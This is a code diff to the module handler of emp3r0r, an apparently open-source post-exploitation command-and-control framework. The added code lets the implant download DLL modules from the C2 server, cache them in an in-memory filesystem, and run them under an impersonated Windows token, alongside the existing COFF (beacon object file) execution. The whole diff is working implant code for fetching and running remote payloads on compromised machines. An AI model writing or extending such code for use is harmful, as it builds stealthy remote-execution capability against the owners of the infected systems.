@@ -2,6 +2,7 @@ package modules
 
 import (
 	"fmt"
+	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
@@ -18,6 +19,8 @@ var fetchFile = c2transport.FetchFile
 
 // ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
 func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation) (out string) {
+	// Canonicalize module names for download/cache keys across all module types.
+	modName = strings.ToLower(modName)
 	defer func() {
 		if r := recover(); r != nil {
 			logging.Errorf("ModuleHandler panic executing %s (%s): %v\n%s", modName, payload_type, r, util.CallStack())
@@ -107,6 +110,23 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 			out, execErr = runCOFFModule(payload_data, invocation, token)
 			if execErr != nil {
 				out = logging.Sprintf("running COFF module: %v", execErr)
+			}
+			return nil
+		})
+		if err != nil {
+			return logging.Sprintf("token impersonation failed: %v", err)
+		}
+		return out
+	case "dll":
+		// Cache the decompressed DLL image in memfs so dependent BOF modules
+		// can re-load it without re-downloading from C2. Module names are
+		// canonicalized to lowercase to match fetchDependencyDLL.
+		_ = util.WriteFileAgent("mem:///"+modName+".dll", payload_data, 0o600)
+		err = executeWithToken(invocation.Token, func(token uintptr) error {
+			var execErr error
+			out, execErr = runDLLModule(payload_data, invocation, token)
+			if execErr != nil {
+				out = logging.Sprintf("running DLL module: %v", execErr)
 			}
 			return nil
 		})
